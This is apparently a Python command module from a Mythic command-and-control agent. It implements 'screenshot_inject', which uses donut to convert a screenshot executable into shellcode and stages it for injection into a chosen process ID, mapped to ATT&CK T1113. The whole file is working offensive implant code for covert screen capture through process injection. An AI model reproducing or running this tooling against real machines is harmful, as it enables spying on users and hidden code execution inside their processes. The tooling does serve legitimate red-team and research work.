import os
from mythic_payloadtype_container.MythicCommandBase import *
from uuid import uuid4
import json
from os import path
from mythic_payloadtype_container.MythicRPC import *
import base64
import donut

class ScreenshotInjectArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "pid": CommandParameter(name="PID", type=ParameterType.Number, description="Process ID to inject into."),
        }

    async def parse_arguments(self):
        if not len(self.command_line):
            raise Exception("Usage: {}".format(ScreenshotInjectCommand.help_cmd))

        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("pid", int(self.command_line))
        self.add_arg("pipe_name", str(uuid4()))
        pass


class ScreenshotInjectCommand(CommandBase):
    cmd = "screenshot_inject"
    needs_admin = False
    help_cmd = "screenshot_inject [pid]"
    description = "Take a screenshot in the session of the target PID"
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@reznok, @djhohnstein"
    argument_class = ScreenshotInjectArguments
    browser_script = BrowserScript(script_name="screenshot", author="@djhohnstein", for_new_ui=True)
    attackmapping = ["T1113"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        exePath = "/srv/ScreenshotInject.exe"
        donutPath = "/Mythic/agent_code/donut"
        command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
        stdout, stderr = await proc.communicate()
        
        command = "{} -f 1 -p \"{}\" {}".format(donutPath, task.args.get_arg("pipe_name"), exePath)
        # need to go through one more step to turn our exe into shellcode
        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                        stderr=asyncio.subprocess.PIPE, cwd="/tmp/")
        stdout, stderr = await proc.communicate()
        if os.path.exists("/tmp/loader.bin"):
            file_resp = await MythicRPC().execute(
                "create_file",
                task_id=task.id,
                file=base64.b64encode(open("/tmp/loader.bin", 'rb').read()).decode(),
                delete_after_fetch=True,
            )
            if file_resp.status == MythicStatus.Success:
                task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
            else:
                raise Exception("Failed to register screenshot assembly: " + file_resp.error)
        else:
            raise Exception("Failed to find loader.bin")
        return task

    async def process_response(self, response: AgentResponse):
        pass
